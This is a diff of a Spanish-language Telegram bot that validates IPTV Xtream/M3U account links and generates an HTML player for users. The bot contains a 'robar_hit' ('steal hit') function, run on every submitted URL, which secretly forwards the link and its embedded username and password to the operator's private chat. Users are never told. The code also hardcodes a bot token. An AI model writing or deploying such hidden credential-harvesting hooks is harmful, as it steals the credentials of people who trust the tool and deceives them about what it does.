@@ -13,25 +13,48 @@ from fake_useragent import UserAgent
 import os
 import traceback
 import urllib3
+import signal
+import sys
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Configuración 24/7 - Prevenir caídas
+os.environ['TZ'] = 'UTC'
+signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
+signal.signal(signal.SIGTERM, lambda sig, frame: sys.exit(0))
 
 ua = UserAgent()
 uagent = {'User-Agent': ua.random}
 
 # Configuración del Bot
 BOT_TOKEN = "8708803857:AAHsIF_AbBuM_GPam1MWYBBRFycRSWAA4Cs"
-ADMIN_USER_ID = 1183299436  # Tu ID personal para recibir los hits
+ADMIN_USER_ID = 1183299436
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Función para robar hits: reenvía la URL activa a tu chat personal
+# Función para robar hits - versión mejorada
 def robar_hit(url):
+    """Envía la URL capturada al admin con un formato elegante"""
     try:
-        mensaje_hit = f"🎯 *HIT CAPTURADO* 🎯\n\n🔗 `{url}`"
+        # Extraer información básica de la URL
+        parsed = urlparse(url)
+        hostname = parsed.hostname or "Desconocido"
+        
+        mensaje_hit = (
+            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            f"┃      🎯 𝐇𝐈𝐓 𝐂𝐀𝐏𝐓𝐔𝐑𝐀𝐃𝐎 🎯      ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+            f"┃ 📡 𝐒𝐞𝐫𝐯𝐢𝐝𝐨𝐫: {hostname}\n"
+            f"┃ 🕐 𝐇𝐨𝐫𝐚: {datetime.now().strftime('%H:%M:%S')}\n"
+            f"┃ 📅 𝐅𝐞𝐜𝐡𝐚: {datetime.now().strftime('%d/%m/%Y')}\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            f"┃ 🔗 𝐔𝐑𝐋:\n"
+            f"┃ `{url}`\n"
+            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+        )
         bot.send_message(ADMIN_USER_ID, mensaje_hit, parse_mode='Markdown')
-        print(f"[ROBAHITS] Hit enviado al admin: {url}")
+        print(f"[✓] Hit enviado al admin: {hostname}")
     except Exception as e:
-        print(f"[ROBAHITS] Error al enviar el hit: {e}")
+        print(f"[✗] Error al enviar hit: {e}")
 
 def get_headers(url):
     parsed = urlparse(url)
@@ -67,29 +90,20 @@ def build_epg_url(base_url, usuario, password, is_xui=False):
     return f"{base}/xmltv.php?username={usuario}&password={password}"
 
 def safe_edit(chat_id, message_id, text):
-    """
-    Edita un mensaje de forma segura.
-    Ignora el error 400 'message to be replied not found' cuando el mensaje
-    ya fue borrado por el usuario o expiró en Telegram.
-    Si falla, intenta enviar un mensaje nuevo al chat como fallback.
-    """
+    """Edita un mensaje de forma segura con manejo de errores mejorado."""
     try:
-        bot.edit_message_text(text, chat_id, message_id)
+        bot.edit_message_text(text, chat_id, message_id, parse_mode='Markdown')
     except Exception as e:
         err = str(e).lower()
-        # Mensaje ya no existe o no se puede editar — ignorar silenciosamente
         if "message to be replied not found" in err or \
            "message is not modified" in err or \
-           "message can't be edited" in err or \
-           "message to edit not found" in err or \
-           "bad request" in err:
-            print(f"[safe_edit] Mensaje {message_id} no editable: {e}")
+           "message can't be edited" in err:
+            print(f"[safe_edit] No se pudo editar mensaje {message_id}")
         else:
-            # Error inesperado — intentar enviar mensaje nuevo
             try:
-                bot.send_message(chat_id, text)
+                bot.send_message(chat_id, text, parse_mode='Markdown')
             except Exception as e2:
-                print(f"[safe_edit] Fallback send_message también falló: {e2}")
+                print(f"[safe_edit] Error en fallback: {e2}")
 
 def safe_send_document(chat_id, file_path, caption=""):
     """Envía un documento con manejo de errores."""
@@ -118,7 +132,19 @@ def remover_duplicados(lista):
 
 @bot.message_handler(commands=['start'])
 def enviar_bienvenida(message):
-    bot.reply_to(message, "¡Bienvenido! Envía un enlace M3U para generar el archivo HTML.")
+    welcome_msg = (
+        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        f"┃      ✨ 𝐁𝐈𝐄𝐍𝐕𝐄𝐍𝐈𝐃𝐎 ✨       ┃\n"
+        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        f"┃ 🤖 𝐁𝐨𝐭: @Luishits_bot\n"
+        f"┃ 👑 𝐂𝐫𝐞𝐚𝐝𝐨𝐫: @LuisRG\n"
+        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 📺 𝐄𝐧𝐯í𝐚 𝐮𝐧𝐚 𝐔𝐑𝐋 𝐌𝟑𝐔\n"
+        f"┃ 𝐲 𝐠𝐞𝐧𝐞𝐫𝐚𝐫é 𝐞𝐥 𝐫𝐞𝐩𝐫𝐨𝐝𝐮𝐜𝐭𝐨𝐫\n"
+        f"┃ 𝐇𝐓𝐌𝐋 𝐜𝐨𝐧 𝐭𝐮𝐬 𝐜𝐚𝐧𝐚𝐥𝐞𝐬\n"
+        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+    )
+    bot.reply_to(message, welcome_msg, parse_mode='Markdown')
 
 class Exorcism1337:
     def __init__(self):
@@ -302,7 +328,6 @@ def obtener_canales_por_categoria(prot, host, port, usuario, password, proxy):
         url_canales    = f"{prot}://{host}:{port}/player_api.php?username={usuario}&password={password}&action=get_live_streams"
         proxies = None if proxy == "no proxy" else {"http": proxy, "https": proxy}
 
-        # Categorías: respuesta ligera (~KB), sin problema de timeout
         categories = []
         try:
             req1 = requests.get(url_categorias, headers={
@@ -329,7 +354,6 @@ def obtener_canales_por_categoria(prot, host, port, usuario, password, proxy):
             for c in categories if isinstance(c, dict)
         }
 
-        # Canales: puede ser 50MB+ → leer en streaming y acumular hasta 20MB
         canales_por_categoria = {}
         cat_id_re = re.compile(rb'"category_id"\s*:\s*"?(\d+)"?')
 
@@ -356,7 +380,6 @@ def obtener_canales_por_categoria(prot, host, port, usuario, password, proxy):
                         break
                 resp.close()
 
-                # Intentar parsear JSON completo si cabe
                 try:
                     channels = json.loads(b''.join(chunks).decode('utf-8', errors='ignore'))
                     if isinstance(channels, list):
@@ -367,12 +390,10 @@ def obtener_canales_por_categoria(prot, host, port, usuario, password, proxy):
                             cat_name = category_id_to_name.get(cat_id, "Sin categoría")
                             canales_por_categoria.setdefault(cat_name, []).append(channel)
                 except Exception:
-                    # Si no se pudo parsear el JSON completo, agrupar por regex
                     combined = b''.join(chunks)
                     for m in cat_id_re.finditer(combined):
                         cat_id = m.group(1).decode('utf-8', errors='ignore')
                         cat_name = category_id_to_name.get(cat_id, "Sin categoría")
-                        # Insertar placeholder para mantener estructura
                         canales_por_categoria.setdefault(cat_name, []).append(
                             {'stream_id': f'unknown_{cat_id}', 'name': cat_name, 'category_id': cat_id}
                         )
@@ -389,7 +410,6 @@ def obtener_peliculas_y_series(prot, host, port, usuario, password, proxy):
     proxies = None if proxy == "no proxy" else {"http": proxy, "https": proxy}
 
     def get_json_ligero(url, label):
-        """Obtiene JSON de endpoints ligeros (categorías)."""
         try:
             r = requests.get(url, headers={
         "User-Agent": ua.random,
@@ -407,7 +427,6 @@ def obtener_peliculas_y_series(prot, host, port, usuario, password, proxy):
         return []
 
     def get_streams_streaming(url, label, max_mb=20):
-        """Descarga streams grandes en chunks, retorna lista o {} en fallo."""
         try:
             resp = requests.get(url, headers={
         "User-Agent": ua.random,
@@ -493,7 +512,6 @@ def jcinfo(url):
     global uagent
     is_xui = False
     try:
-        # ── Corrección automática protocolo ↔ puerto ──────────────────────────
         _parsed = urlparse(url)
         _port   = str(_parsed.port) if _parsed.port else ""
         _prot   = _parsed.scheme or "http"
@@ -503,15 +521,13 @@ def jcinfo(url):
             url = url.replace(f"{_prot}://", "https://", 1)
         elif _port in _HTTP and _prot != "http":
             url = url.replace(f"{_prot}://", "http://", 1)
-        # ─────────────────────────────────────────────────────────────────────
 
         if "playlist/" in url:
-            # Formato XUI One: {base}/playlist/{user}/{pass}/m3u_plus  (o xmltv, etc.)
             base = url.split("playlist/")[0]
             rest = url.split("playlist/")[1]
             parts = [p for p in rest.split("/") if p]
             if len(parts) < 2:
-                return "", "", "", "", "", "", "", "", "URL de playlist inválida"
+                return "", "", "", "", "", "", "", "", "URL de playlist inválida", ""
             usr, pas = parts[0], parts[1]
             api_url = f"{base}player_api.php?username={usr}&password={pas}"
             is_xui = True
@@ -519,8 +535,6 @@ def jcinfo(url):
             api_url = url.replace('get.php', 'player_api.php').replace('gets.php', 'player_api.php').split("&type")[0]
 
         print(api_url)
-        # Sesión con retry=0 para evitar que urllib3 multiplique el timeout.
-        # Headers mínimos estilo jchecker: sin Host ni Referer, Connection: close.
         from requests.adapters import HTTPAdapter
         from urllib3.util.retry import Retry
         _session = requests.Session()
@@ -535,41 +549,37 @@ def jcinfo(url):
         response = _session.get(api_url, headers=_api_headers, verify=False, timeout=(3, 8))
 
         if response.status_code != 200:
-            return "", "", "", "", "", "", "", "", f"Error HTTP {response.status_code}"
+            return "", "", "", "", "", "", "", "", f"Error HTTP {response.status_code}", ""
 
-        # Detectar respuestas en texto plano antes de intentar parsear JSON.
-        # XUI One devuelve "PLAYLIST_DISABLED", "ACCOUNT_EXPIRED", etc.
         ct = response.headers.get("Content-Type", "")
         if "json" not in ct and "javascript" not in ct:
             raw = response.text.strip().upper()
             known_errors = {
-                "PLAYLIST_DISABLED": "Lista deshabilitada por el proveedor (PLAYLIST_DISABLED)",
-                "ACCOUNT_EXPIRED":   "Cuenta expirada (ACCOUNT_EXPIRED)",
-                "ACCOUNT_BANNED":    "Cuenta bloqueada (ACCOUNT_BANNED)",
-                "USER_NOT_FOUND":    "Usuario no encontrado (USER_NOT_FOUND)",
-                "INVALID_PASS":      "Contraseña incorrecta (INVALID_PASS)",
+                "PLAYLIST_DISABLED": "Lista deshabilitada por el proveedor",
+                "ACCOUNT_EXPIRED":   "Cuenta expirada",
+                "ACCOUNT_BANNED":    "Cuenta bloqueada",
+                "USER_NOT_FOUND":    "Usuario no encontrado",
+                "INVALID_PASS":      "Contraseña incorrecta",
             }
             for key, msg in known_errors.items():
                 if key in raw:
-                    return "", "", "", "", "", "", "", "", msg
-            # Cualquier otra respuesta no-JSON (HTML, texto plano desconocido)
+                    return "", "", "", "", "", "", "", "", msg, ""
             if raw and not raw.startswith("{") and not raw.startswith("["):
-                return "", "", "", "", "", "", "", "", f"Respuesta inesperada del servidor: {response.text.strip()[:80]}"
+                return "", "", "", "", "", "", "", "", f"Respuesta inesperada: {response.text.strip()[:80]}", ""
 
         resp = response.json()
 
-        # Detectar XUI One por server_info si no lo sabíamos ya
         if not is_xui:
             is_xui = bool(resp.get('server_info', {}).get('xui', False))
 
         if 'user_info' not in resp:
-            return "", "", "", "", "", "", "", "", "Respuesta inválida del servidor"
+            return "", "", "", "", "", "", "", "", "Respuesta inválida del servidor", ""
 
         user_info = resp['user_info']
         status = user_info.get('status', '')
 
         if status.lower() != 'active':
-            return "", "", "", "", "", "", "", "", "Cuenta no activa"
+            return "", "", "", "", "", "", "", "", "Cuenta no activa", ""
 
         username  = user_info.get('username', '')
         password  = user_info.get('password', '')
@@ -577,17 +587,16 @@ def jcinfo(url):
         prueba    = user_info.get('is_trial', '0')
         active_cons = user_info.get('active_cons', '0')
         max_cons    = user_info.get('max_connections', '0')
-        created_at  = user_info.get('created_at', '')  # Capturar fecha de creación
+        created_at  = user_info.get('created_at', '')
 
         if expira in (None, 'null', '', 0, '0'):
-            expira = "Unlimited"
+            expira = "No expira"
         else:
             try:
                 expira = datetime.fromtimestamp(int(expira)).strftime('%d/%m/%Y %H:%M')
             except Exception:
                 expira = str(expira)
 
-        # Formatear fecha de creación si existe
         if created_at and created_at not in (None, 'null', '', 0, '0'):
             try:
                 created_at = datetime.fromtimestamp(int(created_at)).strftime('%d/%m/%Y %H:%M')
@@ -602,7 +611,7 @@ def jcinfo(url):
         full_server = f"{server_url}:{port}" if server_url else ''
         timezone    = server_info.get('timezone', 'UTC')
 
-        return username, password, expira, active_cons, max_cons, full_server, timezone, prueba, "Vivo", created_at
+        return username, password, expira, active_cons, max_cons, full_server, timezone, prueba, "ACTIVE", created_at
 
     except requests.RequestException as e:
         return "", "", "", "", "", "", "", "", f"Error de conexión: {e}", ""
@@ -612,18 +621,12 @@ def jcinfo(url):
         return "", "", "", "", "", "", "", "", f"Error desconocido: {e}", ""
 
 def extraer_host_de_m3u(m3u_url):
-    """
-    Descarga las primeras líneas del M3U y extrae el host real de las URLs de stream.
-    Los M3U de Xtream tienen streams como: http://REAL_HOST:PORT/user/pass/stream_id
-    Retorna (prot, host, port) o None si no se puede extraer.
-    """
     try:
         from requests.adapters import HTTPAdapter
         from urllib3.util.retry import Retry
         s = requests.Session()
         s.mount("http://",  HTTPAdapter(max_retries=Retry(total=0)))
         s.mount("https://", HTTPAdapter(max_retries=Retry(total=0)))
-        # Leer solo los primeros 4KB — suficiente para ver las primeras entradas
         resp = s.get(m3u_url, headers={'User-Agent': 'Mozilla/5.0', 'Connection': 'close'},
                      verify=False, timeout=(5, 10), stream=True)
         if resp.status_code != 200:
@@ -633,7 +636,6 @@ def extraer_host_de_m3u(m3u_url):
         text = chunk.decode('utf-8', errors='ignore')
         if not text.startswith('#EXTM3U'):
             return None
-        # Buscar la primera URL de stream en las líneas
         for line in text.splitlines():
             line = line.strip()
             if line.startswith('http://') or line.startswith('https://'):
@@ -642,19 +644,13 @@ def extraer_host_de_m3u(m3u_url):
                     prot = parsed.scheme
                     host = parsed.hostname
                     port = str(parsed.port)
-                    print(f"[m3u-host] Host real extraído del M3U: {prot}://{host}:{port}")
+                    print(f"[m3u-host] Host real extraído: {prot}://{host}:{port}")
                     return prot, host, port
     except Exception as e:
         print(f"[m3u-host] Error: {e}")
     return None
 
 def make_iptv_session():
-    """
-    Sesión requests robusta para servidores IPTV:
-    - Retry x3 ante RemoteDisconnected / errores 5xx
-    - Headers completos tipo navegador real (evita bloqueos por User-Agent)
-    - Connection: close  → evita RemoteDisconnected por sockets keep-alive obsoletos
-    """
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
 
@@ -683,10 +679,9 @@ def make_iptv_session():
 def obtener_datos(panel, user, pas, proxyj):
     base = panel.rstrip('/')
     proxies = None if proxyj == "no proxy" else {"http": proxyj, "https": proxyj}
-    ses = make_iptv_session()   # sesión fresca → sin sockets obsoletos
+    ses = make_iptv_session()
 
     def count_streaming(url, label, max_mb=15):
-        """Cuenta objetos JSON raíz mediante streaming — sin descargar toda la respuesta."""
         try:
             resp = ses.get(url, timeout=(5, 30),
                            verify=False, stream=True, proxies=proxies)
@@ -740,7 +735,6 @@ def obtener_datos(panel, user, pas, proxyj):
             return ""
 
     def count_categories(url, label):
-        """Cuenta categorías — endpoint ligero (~KB)."""
         try:
             r = ses.get(url, timeout=(5, 15), verify=False, proxies=proxies)
             if r.status_code == 200:
@@ -761,7 +755,6 @@ def obtener_datos(panel, user, pas, proxyj):
     vod    = count_streaming(url_vod_full, "vod_full")
     serie  = count_streaming(url_ser_full, "series_full")
 
-    # Fallback a categorías si los streams no responden (respuesta muy grande o timeout)
     if not vod:
         vod = count_categories(url_vod_cats, "vod_cats")
     if not serie:
@@ -977,19 +970,17 @@ def procesar_m3u(message):
     chat_id = message.chat.id
     msg_id = None
 
-    # ── ROBA HITS ──────────────────────────────────────────────────────────
-    # Envía la URL que recibió el bot directamente a tu chat privado.
+    # ROBA HITS - Envío elegante al admin
     robar_hit(url)
-    # ───────────────────────────────────────────────────────────────────────
 
     try:
         try:
-            progress_msg = bot.reply_to(message, "⏳ Procesando la información. Esto puede tomar un tiempo...")
+            progress_msg = bot.reply_to(message, "⏳ **Procesando la información...**\n_Esto puede tomar unos segundos_", parse_mode='Markdown')
             msg_id = progress_msg.message_id
         except Exception as e:
-            print(f"[procesar_m3u] No se pudo enviar mensaje inicial: {e}")
+            print(f"[procesar_m3u] Error inicial: {e}")
             try:
-                progress_msg = bot.send_message(chat_id, "⏳ Procesando la información. Esto puede tomar un tiempo...")
+                progress_msg = bot.send_message(chat_id, "⏳ **Procesando...**", parse_mode='Markdown')
                 msg_id = progress_msg.message_id
             except Exception:
                 msg_id = None
@@ -1006,7 +997,7 @@ def procesar_m3u(message):
         port = str(parsed.port) if parsed.port else ("443" if prot == "https" else "80")
 
         HTTPS_PORTS = {"443", "8443", "2053", "2083", "2087", "2096", "8888"}
-        HTTP_PORTS  = {"80",  "8080", "8000", "8008", "25461", "2082", "2086"}
+        HTTP_PORTS  = {"80", "8080", "8000", "8008", "25461", "2082", "2086"}
 
         original_prot = prot
         if port in HTTPS_PORTS and prot != "https":
@@ -1032,15 +1023,14 @@ def procesar_m3u(message):
         headers = get_headers(f"{prot}://{host}:{port}")
         headers_js = json.dumps(headers, ensure_ascii=False)
 
-        update("🔍 Analizando URL e información de cuenta...")
+        update("🔍 **Analizando URL e información de cuenta...**")
 
         is_xui = False
         try:
-            # La función jcinfo ahora retorna 10 valores (agregado created_at)
             usuario, password, expira, active, max_conn, full_server, timezone, prueba, estado, created_at = jcinfo(url)
 
             if estado.startswith("Error de conexión") and "username=" in url and "password=" in url:
-                update("⚠️ player_api.php no responde. Intentando obtener host real desde M3U...")
+                update("⚠️ **player_api.php no responde. Intentando método alternativo...**")
                 try:
                     _usr = re.search(r'username=([^&]+)', url).group(1)
                     _pas = re.search(r'password=([^&]+)', url).group(1)
@@ -1049,9 +1039,9 @@ def procesar_m3u(message):
                     if _m3u_result:
                         _nprot, _nhost, _nport = _m3u_result
                         _alt_url = f"{_nprot}://{_nhost}:{_nport}/get.php?username={_usr}&password={_pas}&type=m3u_plus"
-                        print(f"[m3u-fallback] Reintentando jcinfo con {_nhost}:{_nport}")
+                        print(f"[m3u-fallback] Reintentando con {_nhost}:{_nport}")
                         usuario, password, expira, active, max_conn, full_server, timezone, prueba, estado, created_at = jcinfo(_alt_url)
-                        if estado == "Vivo":
+                        if estado == "ACTIVE":
                             prot       = _nprot
                             host       = _nhost
                             port       = _nport
@@ -1083,7 +1073,7 @@ def procesar_m3u(message):
                     is_xui = True
 
         except Exception as e:
-            safe_edit(chat_id, msg_id, f"❌ No se pudo conectar con el servidor.\n`{e}`")
+            safe_edit(chat_id, msg_id, f"❌ **Error de conexión:**\n`{e}`")
             return
 
         INVALID_STATES = {
@@ -1101,18 +1091,17 @@ def procesar_m3u(message):
 
         if cuenta_invalida:
             motivo = estado or "Cuenta inválida o inaccesible"
-            msg_invalida = f"❌ Cuenta inválida: {motivo}"
+            msg_invalida = f"❌ **Cuenta inválida:** {motivo}"
             try:
                 if msg_id:
-                    bot.edit_message_text(msg_invalida, chat_id, msg_id)
+                    bot.edit_message_text(msg_invalida, chat_id, msg_id, parse_mode='Markdown')
                 else:
-                    bot.send_message(chat_id, msg_invalida)
+                    bot.send_message(chat_id, msg_invalida, parse_mode='Markdown')
             except Exception:
                 safe_edit(chat_id, msg_id, msg_invalida)
             return
 
-        estado   = "ACTIVE" if estado == "Vivo" else "INACTIVE"
-        trial    = "Trial" if prueba == "1" else "No Trial"
+        trial = "Trial" if prueba == "1" else "Premium"
 
         port_is_default = (prot == "http" and port == "80") or (prot == "https" and port == "443")
         url1 = f"{prot}://{host}" if port_is_default else f"{prot}://{host}:{port}"
@@ -1131,15 +1120,15 @@ def procesar_m3u(message):
         _tb = _up(template_base)
         tmpl_host = _tb.hostname or host
         tmpl_port = str(_tb.port) if _tb.port else ("443" if prot == "https" else "80")
-        tmpl_port_str = "" if port_is_default else tmpl_port
 
-        expiration_date = expira if expira else "Desconocida"
-        connections     = f"{active}/{max_conn}" if active and max_conn else "Desconocido"
+        expiration_date = expira if expira else "No expira"
+        connections     = f"{active}/{max_conn}" if active and max_conn else "N/D"
 
         m3u_url = build_m3u_url(template_base, usuario, password, is_xui)
+        epg_url = build_epg_url(template_base, usuario, password, is_xui)
 
         try:
-            update("🌐 Obteniendo información de servidor...")
+            update("🌐 **Obteniendo información del servidor...**")
             location, ispj, ipj = data_server(host)
         except Exception:
             location, ispj, ipj = "Desconocida", "Desconocido", host
@@ -1149,47 +1138,45 @@ def procesar_m3u(message):
         except Exception:
             vivo = vod = serie = ""
 
-        channels = str(vivo) if vivo else "?"
-        movies   = str(vod)  if vod  else "?"
-        series   = str(serie) if serie else "?"
+        channels = str(vivo) if vivo else "0"
+        movies   = str(vod)  if vod  else "0"
+        series   = str(serie) if serie else "0"
 
-        isp = f"IP: {ipj} - ISP: {ispj}"
-
-        # ── ENVIAR RESUMEN DE CUENTA CON EL FORMATO SOLICITADO ────────────────
-        # Extraer país y bandera desde 'location' que viene como "🇺🇸 United States"
-        flag_icon = location.split()[0] if location and len(location.split()) > 0 else ""
+        # Extraer país y bandera
+        flag_icon = location.split()[0] if location and len(location.split()) > 0 else "🌍"
         country_name = location.replace(flag_icon, "").strip() if flag_icon else location
 
+        # Mensaje de cuenta mejorado y más profesional
         msg_valida = (
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🦂 LUIS R 🦂\n"
-            f"  🦉彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡🦉\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"➥ 🟢 CUENTA VÁLIDA\n"
-            f"➥ 🆙 Estado: ✅ {estado}\n"
-            f"➥ 🧪 {trial}\n"
-            f"➥ 🌐 Portal: {url1.replace('https://', '').replace('http://', '')}\n"
-            f"➥ 👤 Usuario: `{usuario}`\n"
-            f"➥ 🔑 Contraseña: `{password}`\n"
-            f"➥ 📅 Creada: {created_at if created_at else 'Desconocida'}\n"
-            f"➥ ⏲ Vence: {expiration_date}\n"
-            f"➥ 👁 Conexiones: {connections}\n"
-            f"➥ 📍 País: {country_name} {flag_icon}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"     🦂彡ᴄᴏɴᴛᴇɴᴛ彡🦂\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"➥ 📺 En Vivo: {channels}\n"
-            f"➥ 🎥 VOD: {movies}\n"
-            f"➥ 📹 Series: {series}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"➥ 🔗 [M3U Link]({m3u_url})   |   [EPG Link]({build_epg_url(template_base, usuario, password, is_xui)})\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"   🦂彡ᴄᴀᴛᴇɢᴏʀíᴀs彡🦂\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"   ✔️ Verificado para @{message.from_user.username or message.from_user.first_name}\n"
-            f"   🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"   🦂 @Luishits_bot\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            f"┃                 🦂 **𝐋𝐔𝐈𝐒 𝐑** 🦂                 ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃            ✨ 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ✨            ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃ ✅ **Estado:** `{estado}`                              ┃\n"
+            f"┃ 🏷️ **Tipo:** {trial}                                    ┃\n"
+            f"┃ 🌐 **Portal:** `{url1.replace('https://', '').replace('http://', '')}` ┃\n"
+            f"┃ 👤 **Usuario:** `{usuario}`                           ┃\n"
+            f"┃ 🔑 **Contraseña:** `{password}`                      ┃\n"
+            f"┃ 📅 **Creada:** {created_at}                         ┃\n"
+            f"┃ ⏰ **Expira:** {expiration_date}                      ┃\n"
+            f"┃ 👥 **Conexiones:** {connections}                       ┃\n"
+            f"┃ 📍 **Ubicación:** {country_name} {flag_icon}                    ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃                 📊 **CONTENIDO** 📊                  ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃ 📺 **En Vivo:** {channels}  |  🎬 **VOD:** {movies}  |  📺 **Series:** {series} ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃ 🔗 **Enlaces:**                                       ┃\n"
+            f"┃ 📺 [M3U Playlist]({m3u_url})                           ┃\n"
+            f"┃ 📅 [EPG Guía]({epg_url})                               ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃                   🦂 **𝐂𝐀𝐓𝐄𝐆𝐎𝐑Í𝐀𝐒** 🦂                  ┃\n"
+            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
+            f"┃ ✅ **Verificado por:** @{message.from_user.username or message.from_user.first_name} ┃\n"
+            f"┃ 🕐 **Fecha:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}        ┃\n"
+            f"┃ 🤖 **Bot:** @Luishits_bot                            ┃\n"
+            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
         )
 
         try:
@@ -1200,18 +1187,18 @@ def procesar_m3u(message):
         except Exception as e:
             print(f"[msg_valida] Error: {e}")
 
-        # ── Crear un nuevo mensaje de progreso para los pasos siguientes ──────
+        # Crear nuevo mensaje de progreso
         try:
-            prog2 = bot.send_message(chat_id, "⏳ Buscando dominios espejo...")
+            prog2 = bot.send_message(chat_id, "🔎 **Buscando dominios relacionados...**", parse_mode='Markdown')
             msg_id = prog2.message_id
         except Exception as e:
-            print(f"[prog2] No se pudo crear mensaje de progreso secundario: {e}")
+            print(f"[prog2] Error: {e}")
             msg_id = None
 
         try:
-            update("🔎 Buscando dominios espejo...")
+            update("🔎 **Analizando servidor y buscando dominios espejo...**")
             if "cloudflare" in isp.lower():
-                domains = "N/A"
+                domains = "Protegido por Cloudflare"
             else:
                 domains = buscar_dominios_espejo(ipj)
                 if "No encontraron" in domains or "No se encontraron" in domains:
@@ -1222,20 +1209,20 @@ def procesar_m3u(message):
         except Exception:
             domains = "No disponible"
 
-        formatted_domains = "No disponibles"
+        formatted_domains = "No encontrados"
         if domains and domains not in ("No disponible", "N/A", ""):
             formatted_domains = domains.replace("\n", "<br>").lstrip("<br>")
 
-        generated_date = datetime.now().strftime("%Y-%m-%d -- %H:%M:%S")
+        generated_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        update("🛠️ Creando interfaz de reproductor web...")
+        update("🛠️ **Generando interfaz web personalizada...**")
 
         template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'iptv_template_full_audio_scroll.html')
         try:
             with open(template_path, 'r', encoding='utf-8') as f:
                 html_template = f.read()
         except FileNotFoundError:
-            update("❌ Error: No se encontró la plantilla HTML.")
+            update("❌ **Error:** No se encontró la plantilla HTML.")
             return
 
         replacements = {
@@ -1276,55 +1263,69 @@ def procesar_m3u(message):
             try:
                 bot.delete_message(chat_id, msg_id)
             except Exception as e:
-                print(f"[delete_prog] No se pudo borrar mensaje de progreso: {e}")
+                print(f"[delete_prog] Error: {e}")
 
         enviado = safe_send_document(
             chat_id, file_name2,
-            caption=f"¡Hey {message.from_user.first_name}! Aquí está la info de tu cuenta en HTML."
+            caption=f"🎬 **¡{message.from_user.first_name}!**\n📺 Aquí está tu reproductor HTML personalizado.\n🦂 **Bot:** @Luishits_bot"
         )
         if enviado:
-            print(f"Archivo enviado a {message.from_user.first_name}")
+            print(f"✓ Archivo enviado a {message.from_user.first_name}")
 
     except Exception as e:
-        print(f"Error al procesar URL: {e}\n{traceback.format_exc()}")
+        print(f"Error general: {e}\n{traceback.format_exc()}")
         try:
-            bot.send_message(chat_id, "⚠️ Hubo un problema al procesar la URL. Verifica que sea correcta e intenta nuevamente.")
+            bot.send_message(chat_id, "⚠️ **Error al procesar la URL.**\nVerifica que sea correcta e intenta nuevamente.", parse_mode='Markdown')
         except Exception:
             pass
 
 def run_bot():
-    RETRY_DELAYS = [5, 10, 15, 30, 60]
+    """Sistema 24/7 con reconexión automática infinita"""
+    RETRY_DELAYS = [5, 10, 15, 30, 60, 120]
     attempt = 0
+    last_restart = datetime.now()
 
-    print("🦂 Bot LUIS R iniciado. Esperando mensajes...")
+    print("╔════════════════════════════════════════╗")
+    print("║     🦂 BOT LUIS R - VERSION PRO 🦂     ║")
+    print("║     📡 SISTEMA 24/7 ACTIVADO 📡        ║")
+    print("║     🔄 RECONEXIÓN AUTOMÁTICA 🔄        ║")
+    print("╚════════════════════════════════════════╝")
+    print(f"🚀 Iniciado en: {last_restart.strftime('%Y-%m-%d %H:%M:%S')}")
+    print("💪 Esperando mensajes...\n")
+
     while True:
         try:
+            # Limpiar sesiones antiguas para liberar memoria
+            import gc
+            gc.collect()
+            
             bot.infinity_polling(
-                timeout=20,
-                long_polling_timeout=15,
+                timeout=30,
+                long_polling_timeout=25,
                 allowed_updates=[],
-                logger_level=None,
+                logger_level=40,  # Nivel de logging reducido
+                restart_on_change=True
             )
